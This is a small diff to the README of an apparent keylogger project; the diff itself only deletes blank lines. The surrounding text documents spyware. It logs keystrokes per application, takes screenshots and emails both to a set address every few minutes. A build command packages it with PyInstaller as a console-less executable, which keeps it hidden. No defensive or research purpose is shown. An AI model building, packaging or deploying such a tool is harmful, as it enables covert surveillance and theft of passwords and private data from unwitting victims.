@@ -76,11 +76,9 @@ pyinstaller --onefile --noconsole keylogger.py
 1. **Keylogger Output**
    - Keystrokes are logged in `key_log.json`, categorized by application.
    - Screenshots are saved in the `screenshots/` folder.
-
 2. **Email Reporting**
    - Emails are sent at regular intervals (default: 5 minutes) to the specified email.
    - Logs and screenshots are attached to the email.
-
 3. **Stopping the Keylogger**
    - Press the `ESC` key in any application to stop the keylogger.
 
